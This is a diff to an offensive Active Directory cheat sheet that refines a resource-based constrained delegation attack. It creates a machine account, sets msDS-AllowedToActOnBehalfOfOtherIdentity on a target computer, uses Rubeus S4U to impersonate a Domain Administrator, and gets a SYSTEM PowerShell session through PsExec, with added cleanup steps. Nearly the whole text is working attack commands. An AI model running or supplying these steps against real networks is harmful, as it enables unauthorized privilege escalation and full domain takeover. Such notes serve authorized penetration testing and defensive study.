@@ -500,10 +500,10 @@ TODO
 If we have GenericALL/GenericWrite privileges on a machine account object of a domain, we can abuse it and impersonate ourselves as any user of the domain to it. For example we can impersonate a Domain Administrator.
 ```
 # Use Powermad to create a new machine account
-New-MachineAccount -MachineAccount <machine_name> -Password $(ConvertTo-SecureString '<machine_password>' -AsPlainText -Force) -Verbose
+New-MachineAccount -MachineAccount <created_machine> -Password $(ConvertTo-SecureString '<machine_password>' -AsPlainText -Force) -Verbose
 
 # Use PowerView and get the SID value of our new machine
-$ComputerSid = Get-DomainComputer <machine_name> -Properties objectsid | Select -Expand objectsid
+$ComputerSid = Get-DomainComputer <created_machine> -Properties objectsid | Select -Expand objectsid
 
 # Then by using the SID we have to build a ACE for the new created machine account
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
@@ -511,15 +511,20 @@ $SDBytes = New-Object byte[] ($SD.BinaryLength)
 $SD.GetBinaryForm($SDBytes, 0)
 
 # Set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over
-Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
+Get-DomainComputer <target_machine> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
 
 # Use rubeus to get the RC4 hash of the machine account
-.\rubeus.exe hash /password:<machine_password> /user:<machine_name> /domain:DOMAIN.FQDN
-RC4 hash -> 48FC3FC78D26CA2DA2B17C7751EAB6BD
+.\rubeus.exe hash /password:<machine_password>
+#extract the rce4_hmac value ==> <rc4_hash>
 
 # Execute the impersonation and get a TGS as Domain Administrator for the service cifs on the DC
-.\rubeus.exe s4u /user:<user> /rc4:<rc4_hash> /impersonateuser:<target_user(Administrator)> /msdsspn:cifs/DC.DOMAIN.FQDN /domain:DC.DOMAIN.FQDN /ptt
+.\rubeus.exe s4u /user:<created_machine$> /rc4:<rc4_hash> /impersonateuser:<target_user(Administrator)> /msdsspn:cifs/<target_machine.DOMAIN.FQDN> /domain:DOMAIN.FQDN /ptt
 
 # Get a session on the DC
-.\PsExec64.exe -accepteula \\DC.DOMAIN.FQDN\ -s powershell.exe
+.\psexec64.exe -accepteula \\<target_machine.DOMAIN.FQDN>\ -s powershell.exe
+
+# Optional cleanup
+# If msds-allowedtoactonbehalfofotheridentity field was empty before
+Get-DomainComputer <target_machine> | Set-DomainObject -Clear 'msds-allowedtoactonbehalfofotheridentity'
+Remove-ADComputer -Identity "<created_machine>"
 ```
